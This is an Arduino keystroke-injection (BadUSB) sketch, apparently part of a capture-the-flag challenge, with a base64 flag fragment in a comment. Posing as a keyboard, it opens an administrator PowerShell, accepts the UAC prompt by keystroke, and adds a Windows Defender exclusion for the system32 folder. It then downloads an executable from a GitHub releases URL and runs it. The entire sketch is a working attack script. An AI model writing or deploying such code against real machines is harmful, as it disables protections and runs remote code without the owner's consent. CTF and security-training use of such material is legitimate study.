#include "Keyboard.h"



void setup() {
  Keyboard.begin();

  delay(1000); // Allow some time for the computer to recognize the device

  // Press WIN + R to open run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  // Type "powershell" into the run dialog
  Keyboard.print("powershell");
  delay(500);

  // This will run PowerShell as admin
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(1000);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1500);

  Keyboard.println("Add-MpPreference -ExclusionPath C:\\Windows\\system32");
  delay(500);
  
  Keyboard.println("$down=New-Object System.Net.WebClient;$url='https://github.com/bemxio/mario-head/releases/latest/download/mario_dist.exe';$file='mario_dist.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit");
  delay(500);

}
//flag part 2 of 2: lX0NvbW1pdHRlZA==
//flag is in base64 in its current state
//Feel free to look around 



void loop() {
  // No loop required for this script
}
